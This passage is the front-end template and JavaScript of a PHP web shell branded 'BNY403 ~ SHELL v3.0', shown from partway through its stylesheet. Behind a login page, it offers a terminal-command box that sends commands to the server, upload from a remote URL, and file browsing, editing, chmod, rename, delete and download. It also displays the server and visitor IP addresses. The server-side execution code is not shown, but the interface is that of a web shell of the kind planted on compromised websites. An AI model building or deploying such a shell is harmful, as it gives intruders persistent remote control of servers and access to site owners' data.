            color: var(--text-primary);
        }

        .plugins-header .badge {
            background: var(--accent-bg);
            color: var(--accent);
            padding: 2px 8px;
            border-radius: 20px;
            font-size: 10px;
            border: 1px solid var(--accent-border);
        }

        .plugins-header .arrow {
            transition: all 0.3s ease;
            font-size: 16px;
            color: var(--text-muted);
        }

        .plugins-header .arrow.collapsed {
            transform: rotate(-90deg);
        }

        .plugins-body {
            overflow-x: auto;
            transition: all 0.3s ease;
            max-height: 500px;
            overflow-y: auto;
        }

        .plugins-body.collapsed {
            max-height: 0 !important;
            overflow: hidden;
        }

        .plugins-table {
            width: 100%;
            border-collapse: collapse;
            font-size: 12px;
        }

        .plugins-table thead {
            background: rgba(0, 0, 0, 0.2);
        }

        .plugins-table th {
            text-align: left;
            padding: 8px 12px;
            font-weight: 600;
            text-transform: uppercase;
            font-size: 9px;
            letter-spacing: 0.5px;
            color: var(--text-muted);
            border-bottom: 1px solid var(--glass-border);
        }

        .plugins-table td {
            padding: 8px 12px;
            border-bottom: 1px solid var(--glass-border);
            color: var(--text-secondary);
        }

        .status-active {
            color: #00ff66;
            background: rgba(0, 255, 100, 0.08);
            padding: 2px 10px;
            border-radius: 20px;
            font-size: 10px;
            border: 1px solid rgba(0, 255, 100, 0.15);
            display: inline-block;
        }

        .status-inactive {
            color: #ff6b6b;
            background: rgba(255, 50, 50, 0.08);
            padding: 2px 10px;
            border-radius: 20px;
            font-size: 10px;
            border: 1px solid rgba(255, 50, 50, 0.15);
            display: inline-block;
        }

        .status-pending {
            color: #ffd93d;
            background: rgba(255, 217, 61, 0.08);
            padding: 2px 10px;
            border-radius: 20px;
            font-size: 10px;
            border: 1px solid rgba(255, 217, 61, 0.15);
            display: inline-block;
        }

        .modal-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.7);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            z-index: 1000;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .modal-overlay.active {
            display: flex;
        }

        .modal {
            background: rgba(0, 0, 0, 0.85);
            backdrop-filter: blur(30px);
            -webkit-backdrop-filter: blur(30px);
            border-radius: 14px;
            padding: 24px;
            max-width: 700px;
            width: 100%;
            max-height: 90vh;
            overflow-y: auto;
            border: 1px solid var(--accent-border);
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.6);
            animation: modalIn 0.3s ease;
        }

        @keyframes modalIn {
            from { transform: scale(0.95); opacity: 0; }
            to { transform: scale(1); opacity: 1; }
        }

        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 14px;
            padding-bottom: 10px;
            border-bottom: 1px solid var(--glass-border);
        }

        .modal-header h2 {
            font-size: 17px;
            font-weight: 600;
            color: var(--accent);
        }

        .modal-close {
            background: none;
            border: none;
            color: var(--text-muted);
            font-size: 20px;
            cursor: pointer;
            transition: all 0.3s ease;
            padding: 2px 8px;
            border-radius: 6px;
        }

        .modal-close:hover {
            background: rgba(255, 50, 50, 0.15);
            color: #ff4444;
        }

        .modal textarea {
            width: 100%;
            min-height: 200px;
            background: rgba(0, 0, 0, 0.4);
            border: 1px solid var(--glass-border);
            color: var(--text-primary);
            padding: 10px;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            resize: vertical;
            transition: all 0.3s ease;
        }

        .modal textarea:focus {
            outline: none;
            border-color: var(--accent);
        }

        .modal .form-group {
            margin-bottom: 12px;
        }

        .modal .form-group label {
            display: block;
            font-size: 11px;
            font-weight: 500;
            margin-bottom: 4px;
            color: var(--text-muted);
        }

        .modal .form-group input {
            width: 100%;
            padding: 7px 10px;
            background: rgba(0, 0, 0, 0.4);
            border: 1px solid var(--glass-border);
            color: var(--text-primary);
            border-radius: 6px;
            font-size: 12px;
            transition: all 0.3s ease;
        }

        .modal .form-group input:focus {
            outline: none;
            border-color: var(--accent);
        }

        .modal .btn-submit {
            background: var(--accent-bg);
            color: var(--accent);
            border: 1px solid var(--accent-border);
            padding: 7px 20px;
            border-radius: 6px;
            font-size: 13px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .modal .btn-submit:hover {
            background: var(--accent-bg);
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(0, 255, 100, 0.05);
        }

        .cmd-output {
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid var(--glass-border);
            border-radius: 8px;
            padding: 10px;
            margin-bottom: 14px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            white-space: pre-wrap;
            word-break: break-all;
            max-height: 200px;
            overflow-y: auto;
            color: var(--accent);
        }

        .cmd-output.error {
            border-color: rgba(255, 50, 50, 0.2);
            color: #ff4444;
        }

        .message {
            padding: 8px 16px;
            border-radius: 8px;
            margin-bottom: 14px;
            font-weight: 500;
            border-left: 3px solid var(--accent);
            background: var(--accent-bg);
            font-size: 12px;
            color: var(--text-secondary);
        }

        .message.success {
            border-color: var(--accent);
            background: var(--accent-bg);
        }

        .message.error {
            border-color: #ff4444;
            background: rgba(255, 50, 50, 0.05);
            color: #ff4444;
        }

        .empty-state {
            text-align: center;
            padding: 30px 20px;
            color: var(--text-muted);
        }
        .empty-state .icon { font-size: 40px; margin-bottom: 8px; }
        .empty-state .text { font-size: 14px; }

        ::-webkit-scrollbar { width: 5px; height: 5px; }
        ::-webkit-scrollbar-track { background: rgba(0, 0, 0, 0.15); border-radius: 3px; }
        ::-webkit-scrollbar-thumb { background: var(--accent-border); border-radius: 3px; }
        ::-webkit-scrollbar-thumb:hover { background: var(--accent); }

        .size-large { color: #ff6b6b; }
        .size-medium { color: #ffd93d; }
        .size-small { color: #6bcbff; }

        @media (max-width: 768px) {
            body { padding: 10px; }
            .header { padding: 14px 18px; flex-direction: column; align-items: stretch; }
            .header-right { justify-content: center; flex-wrap: wrap; }
            .stats-grid { grid-template-columns: repeat(3, 1fr); gap: 8px; }
            .stat-card { padding: 10px; }
            .stat-card .number { font-size: 18px; }
            .info-bar { flex-direction: column; align-items: stretch; gap: 6px; }
            .tools-bar { grid-template-columns: 1fr; padding: 12px 14px; }
            .tools-bar .tool-group { flex-wrap: wrap; }
            .tools-bar input[type="text"] { min-width: 80px; }
            .path-breadcrumb .crumb { font-size: 10px; padding: 2px 8px; }
            .table-header { flex-direction: column; gap: 4px; padding: 10px 14px; }
            .action-buttons .btn-sm { font-size: 8px; padding: 2px 5px; }
            .modal { padding: 14px; margin: 10px; }
            table { font-size: 10px; }
            table th, table td { padding: 4px 8px; }
            .file-icon { font-size: 12px; }
            .plugins-table { font-size: 10px; }
            .plugins-table th, .plugins-table td { padding: 4px 8px; }
            .login-card { padding: 30px 22px; }
        }

        @media (max-width: 480px) {
            .stats-grid { grid-template-columns: repeat(2, 1fr); }
            .header-left .logo { font-size: 18px; }
            .header-left .logo-icon { width: 32px; height: 32px; }
            .path-breadcrumb .crumb .separator { display: none; }
            .login-logo h1 { font-size: 24px; }
            .login-logo .logo-icon { width: 60px; height: 60px; }
        }
    </style>
</head>
<body data-theme="dark">

<?php if (!$isLoggedIn): ?>
    <!-- ============================================
    LOGIN PAGE
    ============================================ -->
    <div class="login-container">
        <div class="login-card">
            <div class="login-logo">
                <div class="logo-icon"></div>
                <h1>BNY<span>403</span></h1>
                <div class="subtitle">~ Secure Shell Access ~</div>
            </div>
            <div class="deco-line"></div>

            <?php if (isset($loginError)): ?>
                <div class="login-error">
                    <span>⚠️</span>
                    <?= htmlspecialchars($loginError) ?>
                </div>
            <?php endif; ?>

            <form method="POST" class="login-form">
                <div class="form-group">
                    <label>👤 Username</label>
                    <div class="input-wrapper">
                        <span class="input-icon">👤</span>
                        <input type="text" 
                               name="username" 
                               placeholder="Enter username" 
                               autocomplete="username"
                               required>
                    </div>
                </div>

                <div class="form-group">
                    <label>🔒 Password</label>
                    <div class="input-wrapper">
                        <span class="input-icon">🔑</span>
                        <input type="password" 
                               name="password" 
                               id="loginPassword"
                               placeholder="Enter password"
                               autocomplete="current-password"
                               required>
                        <button type="button" class="toggle-password" onclick="toggleLoginPassword()">
                            👁️
                        </button>
                    </div>
                </div>

                <button type="submit" name="login" class="login-btn">
                    <span>Sign In</span>
                    <span>→</span>
                </button>
            </form>

            <div class="login-footer">
                <span>BNY403 ~ SHELL v3.0</span>
                <span style="color:rgba(0,255,100,0.2);"> • Secure Connection</span>
            </div>
        </div>
    </div>

    <script>
        function toggleLoginPassword() {
            const input = document.getElementById('loginPassword');
            const btn = document.querySelector('.toggle-password');
            if (input.type === 'password') {
                input.type = 'text';
                btn.textContent = '🙈';
            } else {
                input.type = 'password';
                btn.textContent = '👁️';
            }
        }
    </script>

<?php else: ?>
    <!-- ============================================
    SHELL PAGE
    ============================================ -->
    <div class="container">
        <!-- HEADER -->
        <header class="header">
            <div class="header-left">
                <div class="logo-icon"></div>
                <div class="logo">BNY<span>403</span> <span style="font-size:13px; font-weight:300; opacity:0.5;">~ SHELL</span></div>
                <span class="version">v3.0</span>
            </div>
            <div class="header-right">
                <span class="datetime" id="realtimeClock"><?= date('l, d F Y | H.i.s') ?></span>
                <div class="theme-selector">
                    <button class="theme-btn active" data-theme="dark" onclick="setTheme('dark')">🌙</button>
                    <button class="theme-btn" data-theme="light" onclick="setTheme('light')">☀️</button>
                    <button class="theme-btn" data-theme="green" onclick="setTheme('green')">🌿</button>
                </div>
                <a href="?logout=1" class="logout-btn" onclick="return confirm('Logout?')">🚪 Logout</a>
            </div>
        </header>

        <!-- STATS GRID -->
        <div class="stats-grid">
            <div class="stat-card">
                <div class="icon">📁</div>
                <div class="number"><?= count($items) ?></div>
                <div class="label">Files</div>
            </div>
            <div class="stat-card">
                <div class="icon">👤</div>
                <div class="number">4</div>
                <div class="label">Users</div>
            </div>
            <div class="stat-card">
                <div class="icon">🔌</div>
                <div class="number">7</div>
                <div class="label">Plugins</div>
            </div>
            <div class="stat-card">
                <div class="icon">💾</div>
                <div class="number">10</div>
                <div class="label">Storage</div>
            </div>
            <div class="stat-card">
                <div class="icon">🌐</div>
                <div class="number">2</div>
                <div class="label">Domains</div>
            </div>
            <div class="stat-card">
                <div class="icon">🛡️</div>
                <div class="number">0</div>
                <div class="label">Security</div>
            </div>
            <div class="stat-card">
                <div class="icon">⌨️</div>
                <div class="number">15</div>
                <div class="label">Commands</div>
            </div>
        </div>

        <!-- INFO BAR -->
        <div class="info-bar">
            <div class="info-item">
                <span class="label">Server:</span>
                <span class="value"><?= htmlspecialchars($serverIP) ?></span>
                <?php if (isset($serverIPInfo['countryCode'])): ?>
                    <span class="flag"><?= getCountryFlag($serverIPInfo['countryCode']) ?></span>
                <?php endif; ?>
            </div>
            <div class="info-item">
                <span class="label">Your IP:</span>
                <span class="value"><?= htmlspecialchars($yourIP) ?></span>
                <?php if (isset($yourIPInfo['countryCode'])): ?>
                    <span class="flag"><?= getCountryFlag($yourIPInfo['countryCode']) ?></span>
                <?php endif; ?>
            </div>
            <div class="info-item">
                <span class="badge">🔒 Secure</span>
            </div>
            <div class="info-item">
                <span style="opacity:0.2;">|</span>
                <span style="opacity:0.4;"><?= htmlspecialchars($_SESSION['username'] ?? 'Admin') ?></span>
            </div>
        </div>

        <!-- PATH BREADCRUMB -->
        <div class="path-breadcrumb">
            <span class="label">📂 Path:</span>
            <a href="?path=/" class="crumb crumb-root">🏠</a>
            <?php foreach ($breadcrumbs as $crumb): ?>
                <?php $isLast = ($crumb['path'] === $currentPath); ?>
                <a href="?path=<?= urlencode($crumb['path']) ?>" 
                   class="crumb <?= $isLast ? 'active' : '' ?>">
                    <span class="separator">›</span>
                    <?= htmlspecialchars($crumb['name']) ?>
                </a>
            <?php endforeach; ?>
            <span class="crumb-count">📁 <?= count($items) ?></span>
        </div>

        <!-- MESSAGE -->
        <?php if (!empty($message)): ?>
            <div class="message <?= $messageType ?>">
                <?= htmlspecialchars($message) ?>
            </div>
        <?php endif; ?>

        <!-- TOOLS BAR -->
        <div class="tools-bar">
            <div class="tool-group">
                <label>📁 Folder</label>
                <input type="text" id="folderName" placeholder="New folder name">
                <button class="btn btn-success" onclick="createFolder()">+</button>
            </div>
            <div class="tool-group">
                <label>📄 File</label>
                <input type="text" id="fileName" placeholder="New file name">
                <button class="btn btn-info" onclick="createFile()">+</button>
            </div>
            <div class="tool-group">
                <label>📤 Upload</label>
                <form method="POST" enctype="multipart/form-data" style="display:flex; gap:6px; align-items:center; flex:1;">
                    <input type="file" name="upload_file" style="background:transparent; border:none; color:var(--text-secondary); flex:1; min-width:80px; padding:4px 0;">
                    <button type="submit" name="upload" class="btn btn-upload">⬆</button>
                </form>
            </div>
            <div class="tool-group">
                <label>🔗 Remote</label>
                <input type="text" id="remoteUrl" placeholder="URL">
                <input type="text" id="remoteFilename" placeholder="Save as" style="min-width:70px;">
                <button class="btn btn-info" onclick="remoteUpload()">⬇</button>
            </div>
            <div class="tool-group">
                <label>💻 CMD</label>
                <input type="text" id="cmdInput" placeholder="Terminal command..." onkeydown="if(event.key==='Enter') executeCommand()">
                <button class="btn" onclick="executeCommand()">▶</button>
            </div>
        </div>

        <?php if (!empty($commandOutput)): ?>
            <div class="cmd-output <?= strpos($commandOutput, 'ERROR') !== false ? 'error' : '' ?>">
                <?= htmlspecialchars($commandOutput) ?>
            </div>
        <?php endif; ?>

        <!-- FILE TABLE -->
        <div class="table-wrapper">
            <div class="table-header" onclick="toggleTable()">
                <h3>
                    📂 File Manager
                    <span class="badge"><?= count($items) ?></span>
                </h3>
                <span class="arrow" id="tableArrow">▼</span>
            </div>
            <div class="table-body" id="tableBody">
                <?php if (empty($items)): ?>
                    <div class="empty-state">
                        <div class="icon">📭</div>
                        <div class="text">Directory is empty</div>
                    </div>
                <?php else: ?>
                    <table>
                        <thead>
                            <tr>
                                <th style="min-width:140px;">Name</th>
                                <th>Size</th>
                                <th>Perms</th>
                                <th>Modified</th>
                                <th>Owner</th>
                                <th style="min-width:150px;">Actions</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php foreach ($items as $item): ?>
                                <tr>
                                    <td>
                                        <div class="file-name">
                                            <span class="file-icon"><?= $item['is_dir'] ? '📁' : '📄' ?></span>
                                            <?php if ($item['is_dir']): ?>
                                                <a href="?path=<?= urlencode($item['path']) ?>" class="dir-link">
                                                    <span class="name-text"><?= htmlspecialchars($item['name']) ?></span>
                                                </a>
                                            <?php else: ?>
                                                <span class="name-text"><?= htmlspecialchars($item['name']) ?></span>
                                            <?php endif; ?>
                                        </div>
                                    </td>
                                    <td>
                                        <?php if (!$item['is_dir']): ?>
                                            <span class="<?= $item['size'] > 1048576 ? 'size-large' : ($item['size'] > 102400 ? 'size-medium' : 'size-small') ?>">
                                                <?= formatSize($item['size']) ?>
                                            </span>
                                        <?php else: ?>
                                            <span style="opacity:0.15;">—</span>
                                        <?php endif; ?>
                                    </td>
                                    <td><code class="perms"><?= $item['perms'] ?></code></td>
                                    <td style="font-size:10px; opacity:0.3;"><?= $item['mtime'] ?></td>
                                    <td style="font-size:10px; opacity:0.3;"><?= htmlspecialchars($item['owner']) ?></td>
                                    <td>
                                        <div class="action-buttons">
                                            <?php if (!$item['is_dir']): ?>
                                                <button class="btn-sm" onclick="viewFile('<?= addslashes($item['path']) ?>')">👁</button>
                                                <button class="btn-sm" onclick="editFile('<?= addslashes($item['path']) ?>')">✏️</button>
                                                <a href="?download=<?= urlencode($item['path']) ?>" class="btn-sm success">⬇</a>
                                            <?php endif; ?>
                                            <button class="btn-sm" onclick="openRenameModal('<?= addslashes($item['path']) ?>')">📝</button>
                                            <button class="btn-sm" onclick="openChmodModal('<?= addslashes($item['path']) ?>', '<?= $item['perms'] ?>')">🔒</button>
                                            <a href="?delete=<?= urlencode($item['path']) ?>&path=<?= urlencode($currentPath) ?>" class="btn-sm danger" onclick="return confirm('Delete?')">🗑</a>
                                        </div>
                                    </td>
                                </tr>
                            <?php endforeach; ?>
                        </tbody>
                    </table>
                <?php endif; ?>
            </div>
        </div>

        <!-- PLUGINS TABLE -->
        <div class="plugins-wrapper">
            <div class="plugins-header" onclick="togglePlugins()">
                <h3>
                    🔌 Plugins & Extensions
                    <span class="badge"><?= count($plugins) ?></span>
                </h3>
                <span class="arrow" id="pluginsArrow">▼</span>
            </div>
            <div class="plugins-body" id="pluginsBody">
                <table class="plugins-table">
                    <thead>
                        <tr>
                            <th>Plugin</th>
                            <th>Version</th>
                            <th>Status</th>
                            <th>Action</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php foreach ($plugins as $plugin): ?>
                            <tr>
                                <td><strong style="color:var(--text-primary);"><?= htmlspecialchars($plugin['name']) ?></strong></td>
                                <td style="color:var(--text-muted);"><?= htmlspecialchars($plugin['version']) ?></td>
                                <td>
                                    <span class="status-<?= strtolower($plugin['status']) ?>">
                                        <?= $plugin['status'] ?>
                                    </span>
                                </td>
                                <td>
                                    <?php if ($plugin['status'] == 'Active'): ?>
                                        <button class="btn-sm" style="border-color:rgba(255,50,50,0.15); color:#ff6b6b;">Disable</button>
                                    <?php elseif ($plugin['status'] == 'Inactive'): ?>
                                        <button class="btn-sm" style="border-color:rgba(0,255,100,0.15); color:#00ff66;">Enable</button>
                                    <?php elseif ($plugin['status'] == 'Pending'): ?>
                                        <button class="btn-sm" style="border-color:rgba(255,217,61,0.15); color:#ffd93d;">Update</button>
                                    <?php endif; ?>
                                </td>
                            </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </div>
        </div>
    </div>

    <!-- MODALS -->
    <div class="modal-overlay" id="viewModal">
        <div class="modal">
            <div class="modal-header">
                <h2>👁 View File</h2>
                <button class="modal-close" onclick="closeModal('viewModal')">✕</button>
            </div>
            <div class="form-group">
                <label id="viewFileName">File: </label>
                <pre id="viewContent" style="background:rgba(0,0,0,0.3); padding:12px; border-radius:8px; overflow:auto; max-height:350px; border:1px solid var(--glass-border); font-size:12px; white-space:pre-wrap; word-break:break-all; min-height:80px; color:var(--text-secondary);"></pre>
            </div>
            <button class="btn-submit" onclick="closeModal('viewModal')">Close</button>
        </div>
    </div>

    <div class="modal-overlay" id="editModal">
        <div class="modal">
            <form method="POST" id="editForm">
                <div class="modal-header">
                    <h2>✏️ Edit File</h2>
                    <button class="modal-close" onclick="closeModal('editModal')">✕</button>
                </div>
                <div class="form-group">
                    <label>File Path</label>
                    <input type="text" name="file_path" id="editFilePath" readonly>
                </div>
                <div class="form-group">
                    <label>Content</label>
                    <textarea name="file_content" id="editFileContent"></textarea>
                </div>
                <button type="submit" name="save_file" class="btn-submit">💾 Save</button>
            </form>
        </div>
    </div>

    <div class="modal-overlay" id="renameModal">
        <div class="modal">
            <form method="POST">
                <div class="modal-header">
                    <h2>📝 Rename</h2>
                    <button class="modal-close" onclick="closeModal('renameModal')">✕</button>
                </div>
                <div class="form-group">
                    <label>Current Name</label>
                    <input type="text" name="old_name" id="renameOld" readonly>
                </div>
                <div class="form-group">
                    <label>New Name</label>
                    <input type="text" name="new_name" id="renameNew" required placeholder="Enter new name...">
                </div>
                <button type="submit" name="rename" class="btn-submit">🔄 Rename</button>
            </form>
        </div>
    </div>

    <div class="modal-overlay" id="chmodModal">
        <div class="modal">
            <form method="POST">
                <div class="modal-header">
                    <h2>🔒 Change Permissions</h2>
                    <button class="modal-close" onclick="closeModal('chmodModal')">✕</button>
                </div>
                <div class="form-group">
                    <label>File/Directory</label>
                    <input type="text" name="chmod_target" id="chmodTarget" readonly>
                </div>
                <div class="form-group">
                    <label>Permissions (octal, e.g. 755)</label>
                    <input type="text" name="chmod_perms" id="chmodPerms" required pattern="[0-7]{3,4}" placeholder="Enter octal permissions...">
                </div>
                <div class="form-group">
                    <label>Current: <code id="chmodCurrent" style="background:rgba(0,0,0,0.3); padding:4px 10px; border-radius:4px; color:var(--accent);"></code></label>
                </div>
                <button type="submit" name="chmod" class="btn-submit">🔒 Apply</button>
            </form>
        </div>
    </div>

    <script>
        // Theme
        function setTheme(theme) {
            document.body.setAttribute('data-theme', theme);
            localStorage.setItem('theme', theme);
            document.querySelectorAll('.theme-btn').forEach(btn => {
                btn.classList.toggle('active', btn.dataset.theme === theme);
            });
        }

        const savedTheme = localStorage.getItem('theme') || 'dark';
        setTheme(savedTheme);

        // Realtime Clock
        function updateClock() {
            const now = new Date();
            const days = ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'];
            const months = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'];
            const dateStr = days[now.getDay()] + ', ' + now.getDate() + ' ' + months[now.getMonth()] + ' ' + now.getFullYear();
            const timeStr = String(now.getHours()).padStart(2, '0') + '.' + String(now.getMinutes()).padStart(2, '0') + '.' + String(now.getSeconds()).padStart(2, '0');
            document.getElementById('realtimeClock').textContent = dateStr + ' | ' + timeStr;
        }
        updateClock();
        setInterval(updateClock, 1000);

        // Table Collapse
        let tableCollapsed = false;
        function toggleTable() {
            tableCollapsed = !tableCollapsed;
            const body = document.getElementById('tableBody');
            const arrow = document.getElementById('tableArrow');
            if (tableCollapsed) {
                body.classList.add('collapsed');
                arrow.classList.add('collapsed');
            } else {
                body.classList.remove('collapsed');
                arrow.classList.remove('collapsed');
            }
        }

        // Plugins Collapse
        let pluginsCollapsed = false;
        function togglePlugins() {
            pluginsCollapsed = !pluginsCollapsed;
            const body = document.getElementById('pluginsBody');
            const arrow = document.getElementById('pluginsArrow');
            if (pluginsCollapsed) {
                body.classList.add('collapsed');
                arrow.classList.add('collapsed');
            } else {
                body.classList.remove('collapsed');
                arrow.classList.remove('collapsed');
            }
        }

        // Create Functions
        function createFolder() {
            const name = document.getElementById('folderName').value;
            if (!name) { alert('Please enter folder name'); return; }
            const form = document.createElement('form');
            form.method = 'POST';
            form.innerHTML = `
                <input type="hidden" name="folder_name" value="${name}">
                <input type="hidden" name="create_folder" value="1">
            `;
            document.body.appendChild(form);
            form.submit();
        }

        function createFile() {
            const name = document.getElementById('fileName').value;
            if (!name) { alert('Please enter file name'); return; }
            const form = document.createElement('form');
            form.method = 'POST';
            form.innerHTML = `
                <input type="hidden" name="file_name" value="${name}">
                <input type="hidden" name="create_file" value="1">
            `;
            document.body.appendChild(form);
            form.submit();
        }

        function remoteUpload() {
            const url = document.getElementById('remoteUrl').value;
            const filename = document.getElementById('remoteFilename').value;
            if (!url) { alert('Please enter remote URL'); return; }
            const form = document.createElement('form');
            form.method = 'POST';
            form.innerHTML = `
                <input type="hidden" name="remote_url" value="${url}">
                <input type="hidden" name="remote_filename" value="${filename}">
                <input type="hidden" name="remote_upload" value="1">
            `;
            document.body.appendChild(form);
            form.submit();
        }

        function executeCommand() {
            const cmd = document.getElementById('cmdInput').value;
            if (!cmd) { alert('Please enter command'); return; }
            const form = document.createElement('form');
            form.method = 'POST';
            form.innerHTML = `
                <input type="hidden" name="cmd" value="${cmd}">
                <input type="hidden" name="execute_cmd" value="1">
            `;
            document.body.appendChild(form);
            form.submit();
        }

        // Modal Functions
        function openModal(id) {
            const modal = document.getElementById(id);
            if (modal) {
                modal.classList.add('active');
                document.body.style.overflow = 'hidden';
            }
        }

        function closeModal(id) {
            const modal = document.getElementById(id);
            if (modal) {
                modal.classList.remove('active');
                document.body.style.overflow = '';
            }
        }

        function viewFile(path) {
            document.getElementById('viewFileName').textContent = 'File: ' + path.split('/').pop();
            document.getElementById('viewContent').textContent = 'Loading...';
            openModal('viewModal');
            fetch('?ajax_view=' + encodeURIComponent(path))
                .then(response => response.text())
                .then(content => {
                    document.getElementById('viewContent').textContent = content;
                })
                .catch(error => {
                    document.getElementById('viewContent').textContent = 'Error loading file: ' + error;
                });
        }

        function editFile(path) {
            document.getElementById('editFilePath').value = path;
            document.getElementById('editFileContent').value = 'Loading...';
            openModal('editModal');
            fetch('?ajax_view=' + encodeURIComponent(path))
                .then(response => response.text())
                .then(content => {
                    document.getElementById('editFileContent').value = content;
                })
                .catch(error => {
                    document.getElementById('editFileContent').value = 'Error loading file: ' + error;
                });
        }

        function openRenameModal(path) {
            document.getElementById('renameOld').value = path;
            document.getElementById('renameNew').value = path.split('/').pop();
            openModal('renameModal');
        }

        function openChmodModal(path, perms) {
            document.getElementById('chmodTarget').value = path;
            document.getElementById('chmodCurrent').textContent = perms;
            document.getElementById('chmodPerms').value = perms;
            openModal('chmodModal');
        }

        // Close modals
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape') {
                document.querySelectorAll('.modal-overlay.active').forEach(function(modal) {
                    modal.classList.remove('active');
                    document.body.style.overflow = '';
                });
            }
        });

        document.querySelectorAll('.modal-overlay').forEach(function(overlay) {
            overlay.addEventListener('click', function(e) {
                if (e.target === this) {
                    this.classList.remove('active');
                    document.body.style.overflow = '';
                }
            });
        });

        // Auto-dismiss message
        setTimeout(function() {
            const msg = document.querySelector('.message');
            if (msg) {
                msg.style.transition = 'opacity 0.5s';
                msg.style.opacity = '0';
                setTimeout(function() { msg.remove(); }, 500);
            }
        }, 5000);

        // Enter key for inputs
        document.addEventListener('DOMContentLoaded', function() {
            document.getElementById('folderName').addEventListener('keydown', function(e) {
                if (e.key === 'Enter') createFolder();
            });
            document.getElementById('fileName').addEventListener('keydown', function(e) {
                if (e.key === 'Enter') createFile();
            });
            document.getElementById('remoteUrl').addEventListener('keydown', function(e) {
                if (e.key === 'Enter') remoteUpload();
            });
        });
    </script>

<?php endif; ?>

</body>
</html>